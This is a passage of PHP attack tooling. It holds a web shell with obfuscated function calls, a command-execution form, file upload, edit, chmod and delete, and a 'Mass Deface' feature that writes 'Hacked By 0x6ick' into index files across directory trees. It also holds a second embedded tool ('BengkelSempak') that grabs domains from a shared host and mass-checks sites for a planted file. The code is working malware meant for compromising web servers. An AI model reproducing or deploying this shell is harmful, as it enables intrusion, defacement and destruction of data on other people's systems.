            $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
            if($f[17]($lokasi) && $f[26]($lokasi)) {
                $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content);
                $res .= "[<font color=lime>DONE</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
            }
        }
    }
    if($_POST['tipe_sabun'] == 'mahal') mass_deface_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
    else mass_deface_flat($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
    $_SESSION['feature_output'] = $mass_deface_results;
    redirect_with_message('success', 'Mass Deface Selesai!', $path);
}

if(isset($_FILES['file_upload'])){
    $file_name = sanitizeFilename($_FILES['file_upload']['name']);
    if($f[29]($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)) redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path);
    else redirect_with_message('error', 'File Gagal Diupload !!', $path);
}

// MODIFIED: Bulk action handler logic
if (isset($_POST['bulk_action']) && isset($_POST['selected_files'])) {
    $action = $_POST['bulk_action'];
    $selected_files = $_POST['selected_files'];

    // Handle Zip Action
    if ($action === 'zip_selected' && $f[30]('ZipArchive')) {
        $zip_filename = 'archive_' . $f[31]('Y-m-d_H-i-s') . '.zip';
        $zip_filepath = $path . DIRECTORY_SEPARATOR . $zip_filename;
        $zip = new ZipArchive();
        if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($selected_files as $file) {
                $file_path = $f[23]($file);
                if ($f[43]($file_path)) $zip->addFile($file_path, $f[5]($file_path));
                elseif ($f[17]($file_path)) zip_add_folder($zip, $file_path, $f[33]($f[32]($file_path) . DIRECTORY_SEPARATOR));
            }
            $zip->close();
            redirect_with_message('success', 'File berhasil di-zip ke: ' . $zip_filename, $path);
        } else {
            redirect_with_message('error', 'Gagal membuat file zip!', $path);
        }
    }
    // ADDED: Handle Delete Action
    elseif ($action === 'delete_selected') {
        foreach ($selected_files as $file_to_delete) {
            delete_recursive($file_to_delete);
        }
        redirect_with_message('success', 'Item yang dipilih berhasil dihapus.', $path);
    }
}

if(isset($_GET['option']) && isset($_POST['opt_action'])){
    $target_full_path = $_POST['path_target'];
    $action = $_POST['opt_action'];
    $current_dir = $f[23](isset($_GET['path']) ? $_GET['path'] : $f[24]());
    switch ($action) {
        case 'delete':
            if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'Gagal menghapus! Periksa izin.', $current_dir);
            break;
        case 'chmod_save':
            if($f[34]($target_full_path, $f[35]($_POST['perm_value']))) redirect_with_message('success', 'CHMOD SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'CHMOD Gagal !!', $current_dir);
            break;
        case 'rename_save':
            $new_full_path = $f[32]($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']);
            if($f[36]($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'RENAME Gagal !!', $current_dir);
            break;
        case 'edit_save':
            if($f[26]($target_full_path)) {
                if($f[27]($target_full_path, $_POST['src_content'])) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir);
                else redirect_with_message('error', 'Edit File Gagal !!', $current_dir);
            } else { redirect_with_message('error', 'File tidak writable!', $current_dir); }
            break;
        case 'extract_save':
            if ($f[30]('ZipArchive')) {
                $zip = new ZipArchive;
                if ($zip->open($target_full_path) === TRUE) {
                    $zip->extractTo($current_dir);
                    $zip->close();
                    redirect_with_message('success', 'File berhasil diekstrak!', $current_dir);
                } else { redirect_with_message('error', 'Gagal membuka file zip!', $current_dir); }
            } else { redirect_with_message('error', 'Class ZipArchive tidak ditemukan!', $current_dir); }
            break;
    }
}

if(isset($_GET['create_new'])) {
    $target_path_new = $path . '/' . sanitizeFilename($_POST['create_name']);
    if ($_POST['create_type'] == 'file') {
        if (@$f[27]($target_path_new, '') !== false) redirect_with_message('success', 'File Baru Berhasil Dibuat', $path);
        else redirect_with_message('error', 'Gagal membuat file baru!', $path);
    } elseif ($_POST['create_type'] == 'dir') {
        if (@$f[37]($target_path_new)) redirect_with_message('success', 'Folder Baru Berhasil Dibuat', $path);
        else redirect_with_message('error', 'Gagal membuat folder baru!', $path);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<title><?php echo $f[28]($title); ?></title>
<style>
body{font-family:'Kelly Slab',cursive;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;}
a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;}
a:hover{color:<?php echo $theme_link_hover;?>;}
table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;}
.table_home,.td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;}
#content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;}
#content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;}
input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;}
input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;}
input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;}
h1{font-family:'Kelly Slab';font-size:35px;color:white;margin:20px 0 10px;text-align:center;}
.path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;}
.message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;}
.message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;}
.message.error{background-color:<?php echo $message_error_color;?>;color:white;}
.section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;}
.main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;}
.main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;}
pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;}
</style>
</head>
<body>
<a href="?"><h1 style="color: white;"><?php echo $f[28]($title); ?></h1></a>
<?php
if(isset($_GET['msg_text'])) { echo "<div class='message ".$f[28]($_GET['msg_type'])."'>".$f[28]($_GET['msg_text'])."</div>"; }
if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h4>Hasil Fitur Sebelumnya:</h4><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
?>
<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>
<font color='white'><i class='fa fa-user'></i> User / IP </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDR']; ?></font>
<tr><td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $f[39]($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font>
<tr><td><font color='white'><i class='fa fa-hdd-o'></i> System </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $f[40](); ?></font>
</tr></td></table>
<div class="main-menu">
    <a href="?path=<?php echo $f[38]($path); ?>&action=cmd">Command</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=upload_form">Upload</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=mass_deface_form">Mass Deface</a> |
    <a href="?path=<?php echo $f[38]($path); ?>&action=create_form">Create</a>
</div>
<div class="path-nav">
    <i class="fa fa-folder-o"></i> :
    <?php
    $paths_array = $f[41]('/', $f[42]($path, '/'));
    echo '<a href="?path=/">/</a>';
    $current_built_path = '';
    foreach($paths_array as $pat){
        if(empty($pat)) continue;
        $current_built_path .= '/' . $pat;
        echo '<a href="?path='.$f[38]($current_built_path).'">'.$f[28]($pat).'</a>/';
    }
    ?>
</div>
<?php
$show_file_list = true;
if (isset($_GET['action'])) {
    $show_file_list = false;
    echo '<div class="section-box">';
    switch ($_GET['action']) {
        case 'cmd':
            $cmd_output = (isset($_POST['do_cmd'])) ? $f[28](exe($_POST['cmd_input'])) : '';
            echo '<h3>Execute Command</h3><form method="POST" action="?action=cmd&path='.$f[38]($path).'"><input type="text" name="cmd_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus><input type="submit" name="do_cmd" value=">>" style="width: 70px;"></form>';
            if($cmd_output) echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>';
            break;
        case 'upload_form':
            echo '<h3>Upload File</h3><form enctype="multipart/form-data" method="POST" action="?path='.$f[38]($path).'"><input type="file" name="file_upload" required/><input type="submit" value="UPLOAD" style="margin-left:10px;"/></form>';
            break;
        case 'mass_deface_form':
            echo '<h3>Mass Deface</h3><form method="post" action="?path='.$f[38]($path).'"><p>Tipe:<br><input type="radio" name="tipe_sabun" value="murah" checked>Biasa (1 level) | <input type="radio" name="tipe_sabun" value="mahal">Massal (Rekursif)</p><p>Folder Target:<br><input type="text" name="d_dir" value="'.$f[28]($path).'" style="width:100%"></p><p>Nama File:<br><input type="text" name="d_file" value="index.html" style="width:100%"></p><p>Isi Script:<br><textarea name="script_content" style="width:100%;height:150px">Hacked By 0x6ick</textarea></p><input type="submit" name="start_mass_deface" value="GAS!" style="width:100%"></form>';
            break;
        case 'create_form':
            echo '<h3>Create New</h3><form method="POST" action="?create_new=true&path='.$f[38]($path).'"><select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> <input type="text" name="create_name" required placeholder="Nama file/folder"> <input type="submit" value="Create"></form>';
            break;
        case 'delete':
            echo '<h3>Konfirmasi Hapus: '.$f[28]($f[5]($_GET['target_file'])).'</h3><p style="color:red;text-align:center;">Anda YAKIN? Tindakan ini tidak bisa dibatalkan.</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case 'extract_form':
            echo '<h3>Konfirmasi Ekstrak: '.$f[28]($f[5]($_GET['target_file'])).'</h3><p>Ekstrak semua isi file ini ke direktori saat ini ('.$f[28]($path).')?</p><form method="POST" action="?option=true&path='.$f[38]($path).'"><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="extract_save"><input type="submit" value="YA, EKSTRAK"/> <a href="?path='.$f[38]($path).'" style="margin-left:10px;">BATAL</a></form>';
            break;
        case 'view_file':
            echo '<h3>Viewing: '.$f[28]($f[5]($_GET['target_file'])).'</h3><textarea style="width:100%;height:400px;" readonly>'.$f[28](@$f[50]($_GET['target_file'])).'</textarea>';
            break;
        case 'edit_form':
            echo '<h3>Editing: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'"><textarea name="src_content" style="width:100%;height:400px;">'.$f[28](@$f[50]($_GET['target_file'])).'</textarea><br><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="edit_save"><input type="submit" value="SAVE"/></form>';
            break;
        case 'rename_form':
            echo '<h3>Rename: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">New Name: <input name="new_name_value" type="text" value="'.$f[28]($f[5]($_GET['target_file'])).'"/><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>';
            break;
        case 'chmod_form':
            $current_perms = $f[21]($f[15]('%o', @$f[14]($_GET['target_file'])), -4);
            echo '<h3>Chmod: '.$f[28]($f[5]($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.$f[38]($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'"/><input type="hidden" name="path_target" value="'.$f[28]($_GET['target_file']).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>';
            break;
    }
    echo '</div>';
}

if ($show_file_list) {
    echo '<form method="POST" action="?path='.$f[38]($path).'">';
    echo '<div id="content"><table><tr class="first">';
    echo '<th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th>';
    echo '<th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>';
    $scandir_items = @$f[19]($path);
    if ($scandir_items) {
        $f[47]($scandir_items, function($a, $b) use ($path, $f) {
            if ($a == '..') return -1; if ($b == '..') return 1;
            if ($f[17]($path.'/'.$a) && !$f[17]($path.'/'.$b)) return -1;
            if (!$f[17]($path.'/'.$a) && $f[17]($path.'/'.$b)) return 1;
            return $f[48]($a, $b);
        });
        foreach($scandir_items as $item){
            if($item == '.') continue;
            $full_item_path = $path.DIRECTORY_SEPARATOR.$item;
            $encoded_full_item_path = $f[38]($full_item_path);
            echo "<tr><td class='td_home' style='text-align:center;'>";
            if ($item != '..') echo "<input type='checkbox' class='file-checkbox' name='selected_files[]' value='".$f[28]($full_item_path)."'>";
            echo "</td><td class='td_home'>";
            if($item == '..') echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".$f[38]($f[32]($path))."\">".$f[28]($item)."</a>";
            elseif($f[17]($full_item_path)) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".$f[28]($item)."</a>";
            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".$f[38]($path)."\">".$f[28]($item)."</a>";
            echo "</td><td class='td_home' style='text-align:center;'>".($f[43]($full_item_path) ? $f[44](@$f[45]($full_item_path)/1024,2).' KB' : '--')."</td>";
            echo "<td class='td_home' style='text-align:center;'><font color='".($f[26]($full_item_path) ? '#57FF00' : (!$f[46]($full_item_path) ? '#FF0004' : $theme_fg))."'>".perms($full_item_path)."</font></td>";
            echo "<td class='td_home' style='text-align:center;'><select style='width:100px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".$f[38]($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
            if($f[43]($full_item_path)) {
                echo "<option value='edit_form'>Edit</option>";
                if($f[30]('ZipArchive') && $f[49]($full_item_path, PATHINFO_EXTENSION) == 'zip') echo "<option value='extract_form'>Extract</option>";
            }
            echo "<option value='rename_form'>Rename</option><option value='chmod_form'>Chmod</option></select></td></tr>";
        }
    } else { echo "<tr><td colspan='5' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
    // MODIFIED: Bulk action dropdown
    if ($f[30]('ZipArchive')) {
        echo '<tfoot><tr class="first"><td colspan="5" style="padding:10px;">With selected: <select name="bulk_action"><option value="">Choose...</option><option value="zip_selected">Zip</option><option value="delete_selected">Hapus</option></select> <input type="submit" value="Go"></td></tr></tfoot>'; // ADDED: delete_selected option
    }
    echo '</table></div></form>';
}
?>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 1200px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"><?php echo $f[28]($author); ?></font></b></center>
</body>
</html>
PHP;
}
function sempak() {
    return <<<'PHP'
<?php
// TOOLS GABUT
error_reporting(0);
set_time_limit(0);

// -------------------- Helpers --------------------
function is_possible_domain_folder($name) {
    return preg_match('/^([a-z0-9-]+\.)+[a-z]{2,}$/i', $name);
}
function normalize_lines($text){
    if ($text === null) return [];
    return preg_split("/\r\n|\n|\r/", trim($text));
}

// -------------------- Global Variables --------------------
$active_tool = 'grabber';
$grabber_output = '';
$ext_output = '';
$checker_output = '';
$checker_found_list_string = '';

// -------------------- MAIN LOGIC ROUTER --------------------

// --- 1. DOMAIN GRABBER (Runs on GET 'path') ---
$defaultPath = realpath(dirname(__FILE__)) . '/';
$baseInput = $_GET['path'] ?? '';
if ($baseInput !== '') {
    $active_tool = 'grabber';
    $base = rtrim($baseInput, '/') . '/';
    $domains_list = [];
    if (is_dir($base)) {
        $dirs = scandir($base);
        foreach ($dirs as $d) {
            if ($d === '.' || $d === '..') continue;
            if (is_dir($base . $d) && is_possible_domain_folder($d)) {
                $domains_list[] = "http://$d/";
            }
        }
        sort($domains_list);
        $grabber_output = implode(PHP_EOL, $domains_list);
    } else {
        $grabber_output = "ERROR: Path not found or is not a directory:\n" . htmlspecialchars($base);
    }
}

// --- 2. POST LOGIC (EXT Generator & Mass Checker) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {

    // --- 2a. EXT GENERATOR ---
    if ($_POST['action'] === 'ext_generate') {
        $active_tool = 'ext';
        $input_text = trim($_POST['urllist'] ?? '');
        $old_ext = trim($_POST['oldext'] ?? '');
        $new_ext = trim($_POST['newext'] ?? '');
        $lines = normalize_lines($input_text);
        $results = [];
        
        foreach ($lines as $url) {
            $u = trim($url);
            if ($u === '') continue;
            if ($old_ext !== '' && substr($u, -strlen($old_ext)) === $old_ext) {
                $results[] = substr($u, 0, -strlen($old_ext)) . $new_ext;
            } else {
                $results[] = $u . $new_ext;
            }
        }
        sort($results);
        $ext_output = implode(PHP_EOL, $results);
        @file_put_contents('ext.txt', $ext_output);
    }
     // --- 2b. MASS CHECKER ---
    if ($_POST['action'] === 'mass_check') {
        $active_tool = 'checker';
        
        ob_start(); // Start output buffering to catch all 'echo'
        
        $urls_raw = explode("\n", trim($_POST['urls']));
        $ext     = trim($_POST['ext']);
        $keyword = trim($_POST['keyword']);
        $mode    = $_POST['mode'] ?? 'normal';
        $target_mode = $_POST['target_mode'] ?? 'root';
        
        $urls = [];
        foreach ($urls_raw as $u) {
            if (trim($u) !== '') $urls[] = trim($u);
        }
        
        $keyword_is_empty = ($keyword === '');
        $total_urls = count($urls);
        $counts = ['found' => 0, 'miss' => 0, 'error' => 0, 'skip' => 0];
        $current_url = 1;
        
        // Summary
        echo '<div id="summary-box" class="summary-box">';
        echo '<div>TOTAL: <span id="s-total">' . $total_urls . '</span></div>';
        echo '<div>FOUND: <span id="s-found" style="color:lime">0</span></div>';
        echo '<div>MISS: <span id="s-miss" style="color:red">0</span></div>';
        echo '<div>ERRORS: <span id="s-error" style="color:orange">0</span></div>';
        echo '</div>';
        
        echo "<h4>Scan Results (Scan Mode: " . htmlspecialchars($mode) . " | Target Mode: " . htmlspecialchars($target_mode) . ")</h4>";
        
        $found_list = [];

        // --- FAST MODE (cURL) ---
        if ($mode === 'fast') {
            $multi_handle = curl_multi_init();
            $curl_handles = [];
            $url_map      = [];

            foreach ($urls as $url_input) {
                $test_url = $url_input;
                if (strpos($test_url, '://') === false) $test_url = 'http://' . $test_url;
                if (!filter_var($test_url, FILTER_VALIDATE_URL)) {
                    echo "<span style='color:orange'>($current_url/$total_urls) [SKIP]</span> Invalid Base URL: " . htmlspecialchars($url_input) . "<br>";
                    $counts['skip']++; $current_url++; continue;
                }
                
                $target = '';
                if ($target_mode === 'path') {
                    $base_url = preg_replace('/\/[^\/]*$/', '', $url_input);
                    $target = rtrim($base_url, '/') . '/' . $ext;
                } else {
                    $parsed_url = parse_url($test_url);
                    $target = ($parsed_url['scheme'] ?? 'http') . '://' . $parsed_url['host'] . '/' . $ext;
                }

                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $target, CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => false,
                    CURLOPT_TIMEOUT => 15, CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                ]);
                curl_multi_add_handle($multi_handle, $ch);
                $curl_handles[] = $ch;
                $url_map[(string)$ch] = $target;
            }

            $running = null;
            do { curl_multi_exec($multi_handle, $running); usleep(100); } while ($running > 0);

            foreach ($curl_handles as $ch) {
                $target     = $url_map[(string)$ch];
                $resp       = curl_multi_getcontent($ch);
                $http_code  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curl_error = curl_error($ch);
                $condition_met = false;

                if ($curl_error || $http_code == 0) {
                    echo "<span style='color:orange'>($current_url/$total_urls) [ERROR]</span> " . htmlspecialchars($target) . " <small>(cURL Error: " . htmlspecialchars($curl_error ? $curl_error : 'Connection Failed') . ")</small><br>";
                    $counts['error']++;
                } else {
                    if ($keyword_is_empty) { $condition_met = ($http_code == 200); }
                    else { $condition_met = ($http_code == 200 && $resp !== false && strpos($resp, $keyword) !== false); }
                    
                    if ($condition_met) {
                        echo "<span style='color:lime'>($current_url/$total_urls) [FOUND]</span> " . htmlspecialchars($target) . "<br>";
                        $counts['found']++; $found_list[] = $target;
                    } else {
                        echo "<span style='color:red'>($current_url/$total_urls) [MISS]</span> " . htmlspecialchars($target) . " <small>(Code: $http_code)</small><br>";
                        $counts['miss']++;
                    }
                }
                curl_multi_remove_handle($multi_handle, $ch);
                
                $current_url++;
            }
            curl_multi_close($multi_handle);
        }
        
        else {
            foreach ($urls as $url_input) {
                $test_url = $url_input;
                if (strpos($test_url, '://') === false) $test_url = 'http://' . $test_url;
                if (!filter_var($test_url, FILTER_VALIDATE_URL)) {
                    echo "<span style='color:orange'>($current_url/$total_urls) [SKIP]</span> Invalid Base URL: " . htmlspecialchars($url_input) . "<br>";
                    $counts['skip']++; $current_url++; continue;
                }

                $target = '';
                if ($target_mode === 'path') {
                    $base_url = preg_replace('/\/[^\/]*$/', '', $url_input);
                    $target = rtrim($base_url, '/') . '/' . $ext;
                } else {
                    $parsed_url = parse_url($test_url);
                    $target = ($parsed_url['scheme'] ?? 'http') . '://' . $parsed_url['host'] . '/' . $ext;
                }
                
                $context = stream_context_create([
                    "ssl" => ["verify_peer" => false, "verify_peer_name" => false],
                    "http" => [
                        "timeout" => 15,
                        "user_agent" => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                    ]
                ]);
                
                $resp = @file_get_contents($target, false, $context);
                $condition_met = false;

                if ($resp === false) {
                    if (!isset($http_response_header)) {
                        echo "<span style='color:orange'>($current_url/$total_urls) [ERROR]</span> " . htmlspecialchars($target) . " <small>(Connection Failed)</small><br>";
                        $counts['error']++;
                    } else {
                        preg_match('/HTTP\/.* (\d{3})/', $http_response_header[0], $matches);
                        $http_code = $matches[1] ?? 'N/A';
                        echo "<span style='color:red'>($current_url/$total_urls) [MISS]</span> " . htmlspecialchars($target) . " <small>(Code: $http_code)</small><br>";
                        $counts['miss']++;
                    }
                } else {
                    if ($keyword_is_empty) { $condition_met = true; }
                    else { $condition_met = (strpos($resp, $keyword) !== false); }
                    
                    if ($condition_met) {
                        echo "<span style='color:lime'>($current_url/$total_urls) [FOUND]</span> " . htmlspecialchars($target) . "<br>";
                        $counts['found']++; $found_list[] = $target;
                    } else {
                        echo "<span style='color:red'>($current_url/$total_urls) [MISS]</span> " . htmlspecialchars($target) . " <small>(Keyword Not Found)</small><br>";
                        $counts['miss']++;
                    }
                }

                $current_url++;
            }
        }

        if (!empty($found_list)) {
            file_put_contents('found.txt', implode(PHP_EOL, $found_list) . PHP_EOL, FILE_APPEND);
            $checker_found_list_string = implode(PHP_EOL, $found_list);
        }
        echo "<br><a href='found.txt' target='blank' class='download'>Download found.txt</a>";
        

        echo "<script>";
        echo "document.getElementById('s-found').innerText = '" . $counts['found'] . "';";
        echo "document.getElementById('s-miss').innerText = '" . $counts['miss'] . "';";
        echo "document.getElementById('s-error').innerText = '" . $counts['error'] + $counts['skip'] . "';";
        echo "</script>";

        // Get buffered output and assign to variable
        $checker_output = ob_get_clean(); 
    }
}
// This closes the PHP block before HTML starts
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BengkelSempak</title>
<style>
:root {
  --bg-deep: #121212;     
  --bg-main: #1a1a1a;     
  --text-main: #e0e0e0;   
  --text-muted: #8899aa;  
  --accent: #00f0e6;      
  --border: #334455;      
  --title: #ffffff;       
  --found: #50fa7b;       
  --miss: #ff5555;        
}

*{box-sizing:border-box}
body{
  margin:0; font-family:"Courier New",Courier,monospace;
  
  background: linear-gradient(180deg, var(--bg-deep) 0%, var(--bg-main) 100%);
  
  color: var(--text-main); 
  display:flex; justify-content:center; padding:26px;
}
.wrap{width:100%;max-width:980px}
.header{text-align:center;margin-bottom:14px}
.title{
  font-size:42px;
  
  color: var(--title);
  
  text-shadow: 0 0 10px rgba(0, 240, 230, 0.2); 
  letter-spacing:2px;margin:6px 0;font-weight:700
}
.card{
  background:transparent;
  padding:14px;border-radius:8px;
  border: 1px solid var(--border);
}
.tabs{display:flex;gap:8px;margin:16px 0}
.tab{
  flex:1;padding:12px;
  background:rgba(0,0,0,0.5);
  border: 1px solid var(--border);
  color: var(--text-muted); 
  text-align:center;cursor:pointer;border-radius:6px;font-weight:600;
  transition: all 0.2s ease;
}
.tab:hover {
  color: var(--text-main);
  border-color: var(--accent);
}
.tab.active{
  background: var(--accent); 
  color: var(--bg-deep); 
  box-shadow: 0 0 18px rgba(0, 240, 230, 0.2);
  border-color: var(--accent);
}
.panel{
  margin-top:12px;padding:16px;border-radius:8px;
  background: var(--bg-deep);
  border: 1px solid var(--border);
  display:none;
}
label{
  display:block;
  color: var(--text-muted);
  margin:8px 0 6px;font-size:14px
}
.input, textarea, select {
  width:100%;padding:10px 12px;
  background:transparent;
  border: 1px solid var(--border);
  color: var(--text-main); 
  border-radius:6px;outline:none;font-family:inherit;
  transition: all 0.2s ease;
}

.input:focus, textarea:focus, select:focus {
  border-color: var(--accent);
  box-shadow: 0 0 10px rgba(0, 240, 230, 0.2);
}
textarea{min-height:140px;resize:vertical}
.btn{
  display:inline-block;
  background: var(--accent);
  color: var(--bg-deep); 
  padding:10px 18px;margin-top:10px;border-radius:6px;
  font-weight:700;cursor:pointer;border:0;
  transition: all 0.2s ease;
}
.btn:hover {
  opacity: 0.8;
}
.btn.secondary{
  background: transparent;
  color: var(--accent);
  border: 1px solid var(--accent);
}
.btn.secondary:hover {
  background: var(--accent);
  color: var(--bg-deep);
  opacity: 1;
}
.small{
  font-size:13px;
  color: var(--text-muted); 
}
.result{
  margin-top:12px;padding:12px;
  background: var(--bg-deep); 
  border: 1px dashed var(--border); 
  border-radius:6px;
  color: var(--text-main); 
  white-space:pre-wrap;font-family:monospace
}
.footer{
  text-align:center;
  color: var(--text-muted); 
  margin-top:18px;font-size:13px
}
.flex{display:flex;gap:10px;align-items:flex-start}
.col{flex:1}
a.download{
  color: var(--accent); 
  font-weight:700;text-decoration:none
}
.checker-result { 
  margin-top:15px; padding:10px; 
  background: #000; 
  border-radius: 5px; border: 1px solid var(--border); 
  max-height: 300px; overflow-y: auto; 
}
//t.me/yungx6ick
.checker-result span[style*="color:lime"] { color: var(--found) !important; }
.checker-result span[style*="color:red"] { color: var(--miss) !important; }
.checker-result span[style*="color:orange"] { color: #ffb86c !important; } 

.summary-box {
  display: flex;
  justify-content: space-around;
  background: var(--bg-deep); 
  padding: 15px;
  border-radius: 6px;
  border: 1px solid var(--accent); 
  margin-bottom: 15px;
  font-size: 1.2em;
  font-weight: bold;
}

.summary-box span[style*="color:lime"] { color: var(--found) !important; }
.summary-box span[style*="color:red"] { color: var(--miss) !important; }

.summary-box div {
  flex: 1;
  text-align: center;
}
</style>
<script>
function showTab(id){
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
  document.getElementById('tab-'+id).classList.add('active');
  document.getElementById('panel-'+id).style.display='block';
}
function copyTxt(id){
  const el = document.getElementById(id);
  if (!el) return;
  navigator.clipboard.writeText(el.value).then(()=>alert('Copied!'));
}
//0x6ick.my.id
window.addEventListener('DOMContentLoaded', ()=> showTab('<?php echo $active_tool; ?>'));
</script>
</head>
<body>
<div class="wrap">
  <div class="header">
    <div class="title">BengkelSempak</div>
    <div class="small">Tidak ada yang sia-sia,bahkan sempak juga punya manfaat.</div>
  </div>

  <div class="card">
    <div class="tabs">
      <div class="tab" id="tab-grabber" onclick="showTab('grabber')">Domain Grabber</div>
      <div class="tab" id="tab-ext" onclick="showTab('ext')">EXT Generator</div>
      <div class="tab" id="tab-checker" onclick="showTab('checker')">Mass Checker</div>
    </div>

    <div class="panel" id="panel-grabber">
      <h3>Domain Grabber</h3>
      <div class="small">Scans a local directory for folder names that look like domains.</div>
      <form method="GET" action="">
        <label for="path">Local Directory Path</label>
        <input type="text" name="path" class="input" value="<?php echo htmlspecialchars($baseInput); ?>" placeholder="<?php echo htmlspecialchars($defaultPath); ?>">
        <button type="submit" class="btn">Grab Domains</button>
      </form>
      
      <?php if (!empty($grabber_output)): ?>
      <label style="margin-top:15px;">Results</label>
